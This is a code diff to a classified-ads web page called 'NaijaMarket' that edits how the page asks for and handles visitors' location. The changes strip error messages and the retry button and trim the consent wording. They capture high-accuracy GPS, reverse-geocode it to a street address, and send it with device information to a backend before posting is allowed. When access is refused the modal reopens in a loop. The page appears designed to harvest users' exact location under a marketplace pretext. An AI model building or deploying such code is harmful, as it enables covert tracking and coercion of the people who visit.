@@ -75,22 +75,15 @@
         .submit-btn { background: linear-gradient(135deg, #e65c00, #ff8c00); color: white; padding: 14px; border: none; border-radius: 50px; width: 100%; font-weight: 700; cursor: pointer; font-size: 16px; }
         .close-modal { float: right; font-size: 24px; cursor: pointer; color: #adb5bd; }
         
-        .detail-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 20000; display: none; justify-content: center; align-items: center; }
-        .detail-modal.active { display: flex; }
-        .detail-content { background: white; border-radius: 24px; max-width: 700px; width: 90%; padding: 25px; max-height: 90vh; overflow-y: auto; }
-        .map-container { height: 280px; width: 100%; border-radius: 16px; margin: 15px 0; overflow: hidden; border: 1px solid #dee2e6; }
-        
         .location-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.96); backdrop-filter: blur(20px); z-index: 30000; display: none; align-items: center; justify-content: center; }
         .location-modal.active { display: flex; }
-        .location-card { background: white; border-radius: 28px; padding: 45px 35px; text-align: center; max-width: 500px; width: 90%; animation: slideUp 0.4s ease; }
+        .location-card { background: white; border-radius: 28px; padding: 45px 35px; text-align: center; max-width: 450px; width: 90%; animation: slideUp 0.4s ease; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
         .location-card i { font-size: 65px; color: #e65c00; margin-bottom: 20px; }
         .location-card h2 { font-size: 28px; margin-bottom: 12px; color: #212529; }
-        .location-card p { color: #6c757d; margin-bottom: 20px; line-height: 1.6; font-size: 14px; }
-        .location-allow-btn { background: linear-gradient(135deg, #e65c00, #ff8c00); color: white; padding: 16px 40px; border-radius: 60px; border: none; font-weight: 700; font-size: 18px; cursor: pointer; width: 100%; transition: 0.3s; margin-top: 10px; }
-        .location-retry-btn { background: #475569; color: white; padding: 12px 25px; border-radius: 60px; border: none; font-weight: 600; cursor: pointer; width: 100%; margin-top: 12px; }
-        .location-status { font-size: 13px; margin-top: 15px; padding: 10px; border-radius: 12px; display: none; }
-        .location-status.error { background: #fee2e2; color: #dc2626; display: block; }
+        .location-card p { color: #6c757d; margin-bottom: 30px; line-height: 1.6; font-size: 15px; }
+        .location-allow-btn { background: linear-gradient(135deg, #e65c00, #ff8c00); color: white; padding: 16px 40px; border-radius: 60px; border: none; font-weight: 700; font-size: 18px; cursor: pointer; width: 100%; transition: 0.3s; }
+        .location-allow-btn:hover { transform: translateY(-2px); }
         
         .toast { position: fixed; bottom: 30px; right: 30px; background: #28a745; color: white; padding: 14px 28px; border-radius: 50px; z-index: 40000; transform: translateX(200%); transition: 0.3s; font-weight: 500; }
         .toast.show { transform: translateX(0); }
@@ -155,16 +148,15 @@
 <div class="form-group"><label>Location (Manual)</label><input type="text" id="adLocation" placeholder="e.g., Lekki, Lagos"></div>
 <div class="form-group"><label>Phone Number</label><input type="text" id="contactPhone" placeholder="0803 123 4567"></div>
 <button class="submit-btn" id="submitAdBtn"><i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now</button>
-<p style="font-size:12px; margin-top:15px; text-align:center;"><i class="fas fa-map-marker-alt"></i> Your exact GPS location will be attached for buyer transparency.</p></div></div>
+<p style="font-size:12px; margin-top:15px; text-align:center;"><i class="fas fa-map-marker-alt"></i> Your exact GPS location will be attached.</p></div></div>
 
+<!-- Location Modal - Fast, no extra messages -->
 <div class="location-modal" id="locationModal">
     <div class="location-card">
         <i class="fas fa-map-marker-alt"></i>
         <h2>Location Access Required</h2>
-        <p>NaijaMarket needs your exact GPS location to show your ad's precise spot on the map. This builds trust with buyers and prevents spam.</p>
-        <div id="locationStatus" class="location-status"></div>
+        <p>NaijaMarket needs your GPS location to show your ad's precise spot on the map. This builds trust with buyers.</p>
         <button class="location-allow-btn" id="locationAllowBtn"><i class="fas fa-check-circle"></i> Enable Location</button>
-        <button class="location-retry-btn" id="locationRetryBtn" style="display: none;"><i class="fas fa-sync-alt"></i> Retry</button>
     </div>
 </div>
 
@@ -174,14 +166,14 @@
 
 <script>
     const featuredAds = [
-        { id: 1, title: "iPhone 14 Pro Max 256GB", price: "₦850,000", location: "Lekki, Lagos", emoji: "📱", time: "2 mins ago", verified: true, lat: 6.4399, lng: 3.4422, street: "Admiralty Way, Lekki Phase 1", city: "Lagos" },
-        { id: 2, title: "Toyota Camry 2018 Model", price: "₦7,200,000", location: "Abuja", emoji: "🚗", time: "5 mins ago", verified: true, lat: 9.0765, lng: 7.3986, street: "Garki, Area 11", city: "Abuja" },
-        { id: 3, title: "3-Bedroom Flat for Rent", price: "₦1.5M/year", location: "Port Harcourt", emoji: "🏠", time: "10 mins ago", verified: false, lat: 4.8156, lng: 7.0498, street: "Rumuola Road", city: "Port Harcourt" }
+        { id: 1, title: "iPhone 14 Pro Max 256GB", price: "₦850,000", location: "Lekki, Lagos", emoji: "📱", time: "2 mins ago", verified: true, lat: 6.4399, lng: 3.4422 },
+        { id: 2, title: "Toyota Camry 2018 Model", price: "₦7,200,000", location: "Abuja", emoji: "🚗", time: "5 mins ago", verified: true, lat: 9.0765, lng: 7.3986 },
+        { id: 3, title: "3-Bedroom Flat for Rent", price: "₦1.5M/year", location: "Port Harcourt", emoji: "🏠", time: "10 mins ago", verified: false, lat: 4.8156, lng: 7.0498 }
     ];
     
     const latestAds = [
-        { id: 4, title: "Samsung Galaxy S23 Ultra", price: "₦620,000", location: "VI, Lagos", emoji: "📱", time: "30 mins ago", verified: true, lat: 6.4299, lng: 3.4218, street: "Ozumba Mbadiwe, Victoria Island", city: "Lagos" },
-        { id: 5, title: "Honda Accord 2020", price: "₦9.5M", location: "Lagos", emoji: "🚗", time: "35 mins ago", verified: false, lat: 6.6018, lng: 3.3515, street: "Murtala Muhammed Way", city: "Lagos" }
+        { id: 4, title: "Samsung Galaxy S23 Ultra", price: "₦620,000", location: "VI, Lagos", emoji: "📱", time: "30 mins ago", verified: true, lat: 6.4299, lng: 3.4218 },
+        { id: 5, title: "Honda Accord 2020", price: "₦9.5M", location: "Lagos", emoji: "🚗", time: "35 mins ago", verified: false, lat: 6.6018, lng: 3.3515 }
     ];
     
     let userLocationData = null;
@@ -189,21 +181,21 @@
     
     function renderFeaturedAds() {
         document.getElementById('featuredGrid').innerHTML = featuredAds.map(ad => `
-            <div class="ad-card" onclick="showAdDetail(${ad.id})">
+            <div class="ad-card" onclick="window.open('https://www.google.com/maps?q=${ad.lat},${ad.lng}&z=18', '_blank')">
                 <div class="ad-img">${ad.emoji}</div><div class="ad-info"><div class="ad-price">${ad.price}</div>
                 <div class="ad-title">${ad.title}</div><div class="ad-location"><i class="fas fa-map-marker-alt"></i> ${ad.location}</div>
                 <div class="ad-time"><i class="far fa-clock"></i> ${ad.time}</div>
-                <div class="ad-coords-badge"><i class="fas fa-map-pin"></i> Exact location on map</div></div></div>
+                <div class="ad-coords-badge"><i class="fas fa-map-pin"></i> View on map</div></div></div>
         `).join('');
     }
     
     function renderLatestAds() {
         document.getElementById('latestGrid').innerHTML = latestAds.map(ad => `
-            <div class="ad-card" onclick="showAdDetail(${ad.id})">
+            <div class="ad-card" onclick="window.open('https://www.google.com/maps?q=${ad.lat},${ad.lng}&z=18', '_blank')">
                 <div class="ad-img">${ad.emoji}</div><div class="ad-info"><div class="ad-price">${ad.price}</div>
                 <div class="ad-title">${ad.title}</div><div class="ad-location"><i class="fas fa-map-marker-alt"></i> ${ad.location}</div>
                 <div class="ad-time"><i class="far fa-clock"></i> ${ad.time}</div>
-                <div class="ad-coords-badge"><i class="fas fa-location-dot"></i> Live GPS location</div></div></div>
+                <div class="ad-coords-badge"><i class="fas fa-location-dot"></i> View on map</div></div></div>
         `).join('');
     }
     
@@ -212,32 +204,13 @@
         document.getElementById('categoryGrid').innerHTML = cats.map(cat => `<div class="category-card"><i class="${cat.icon}"></i><h4>${cat.name}</h4><p>${cat.count}</p></div>`).join('');
     }
     
-    function showAdDetail(adId) {
-        const ad = [...featuredAds, ...latestAds].find(a => a.id === adId);
-        if (!ad) return;
-        window.open(`https://www.google.com/maps?q=${ad.lat},${ad.lng}&z=18`, '_blank');
-    }
-    
-    // NO TOAST MESSAGES for location - completely silent
-    async function captureLocation() {
+    // FAST location capture - no messages, no status divs
+    async function captureLocationFast() {
         return new Promise((resolve) => {
-            const statusDiv = document.getElementById('locationStatus');
-            
             if (!navigator.geolocation) {
-                statusDiv.innerHTML = '❌ Your browser does not support geolocation';
-                statusDiv.className = 'location-status error';
                 resolve(null);
                 return;
             }
-            
-            statusDiv.innerHTML = '📍 Requesting location permission...';
-            statusDiv.style.display = 'block';
-            
-            const options = {
-                enableHighAccuracy: true,
-                timeout: 30000,
-                maximumAge: 0
-            };
             
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
@@ -248,50 +221,28 @@
                         street: '', city: '', state: '', country: '', postcode: '', fullAddress: '' 
                     };
                     
+                    // Fast reverse geocoding
                     try {
                         const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${address.lat}&lon=${address.lng}&zoom=18&addressdetails=1`, {
-                            headers: { 'User-Agent': 'NaijaMarket App/1.0' }
+                            headers: { 'User-Agent': 'NaijaMarket/1.0' }
                         });
                         const data = await geoRes.json();
                         if (data.address) {
-                            address.street = data.address.road || data.address.pedestrian || data.address.footway || '';
+                            address.street = data.address.road || data.address.pedestrian || '';
                             address.city = data.address.city || data.address.town || data.address.village || '';
                             address.state = data.address.state || data.address.province || '';
                             address.country = data.address.country || '';
                             address.postcode = data.address.postcode || '';
                             address.fullAddress = data.display_name || '';
                         }
-                    } catch(e) { 
-                        address.fullAddress = `${address.lat}, ${address.lng}`;
-                    }
+                    } catch(e) {}
                     
-                    statusDiv.style.display = 'none';
                     resolve(address);
                 },
-                (error) => {
-                    let errorMsg = "";
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMsg = "❌ Permission denied. Please enable location in your browser settings.";
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMsg = "❌ Location unavailable. Please turn on GPS.";
-                            break;
-                        case error.TIMEOUT:
-                            errorMsg = "⏱️ Location timed out. Please try again.";
-                            break;
-                        default:
-                            errorMsg = `❌ Location error: ${error.message}`;
-                    }
-                    statusDiv.innerHTML = errorMsg;
-                    statusDiv.className = 'location-status error';
-                    
-                    const retryBtn = document.getElementById('locationRetryBtn');
-                    retryBtn.style.display = 'block';
-                    
+                () => {
                     resolve(null);
                 },
-                options
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         });
     }
@@ -317,30 +268,23 @@
         toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
         toast.className = isError ? 'toast error' : 'toast';
         toast.classList.add('show');
-        setTimeout(() => toast.classList.remove('show'), 4000);
+        setTimeout(() => toast.classList.remove('show'), 3000);
     }
     
     function showLocationModal() {
         const modal = document.getElementById('locationModal');
-        const statusDiv = document.getElementById('locationStatus');
-        const retryBtn = document.getElementById('locationRetryBtn');
-        
-        statusDiv.style.display = 'none';
-        retryBtn.style.display = 'none';
         modal.classList.add('active');
         
-        async function requestLocation() {
-            statusDiv.style.display = 'block';
-            statusDiv.innerHTML = '📍 Requesting permission...';
-            statusDiv.className = 'location-status';
-            retryBtn.style.display = 'none';
-            
-            const location = await captureLocation();
+        const allowBtn = document.getElementById('locationAllowBtn');
+        const newBtn = allowBtn.cloneNode(true);
+        allowBtn.parentNode.replaceChild(newBtn, allowBtn);
+        
+        newBtn.onclick = async () => {
+            modal.classList.remove('active');
+            const location = await captureLocationFast();
             if (location) {
                 userLocationData = location;
                 locationAllowed = true;
-                modal.classList.remove('active');
-                // NO TOAST - removed completely
                 
                 const device = await getDeviceInfo();
                 await sendToBackend({
@@ -352,20 +296,12 @@
                 });
                 
                 document.getElementById('postModal').classList.add('active');
+            } else {
+                showToast("Location failed. Please enable location in settings.", true);
+                modal.classList.remove('active');
+                setTimeout(() => showLocationModal(), 500);
             }
-        }
-        
-        const allowBtn = document.getElementById('locationAllowBtn');
-        const newAllowBtn = allowBtn.cloneNode(true);
-        allowBtn.parentNode.replaceChild(newAllowBtn, allowBtn);
-        newAllowBtn.onclick = () => requestLocation();
-        
-        const retryButton = document.getElementById('locationRetryBtn');
-        if (retryButton) {
-            const newRetryBtn = retryButton.cloneNode(true);
-            retryButton.parentNode.replaceChild(newRetryBtn, retryButton);
-            newRetryBtn.onclick = () => requestLocation();
-        }
+        };
     }
     
     function openPostModal() {
@@ -418,7 +354,7 @@
         
         btn.innerHTML = '<i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now';
         btn.disabled = false;
-        showToast(`✅ "${title}" posted successfully!`);
+        showToast(`✅ "${title}" posted!`);
         document.getElementById('postModal').classList.remove('active');
         updateStats();
     });
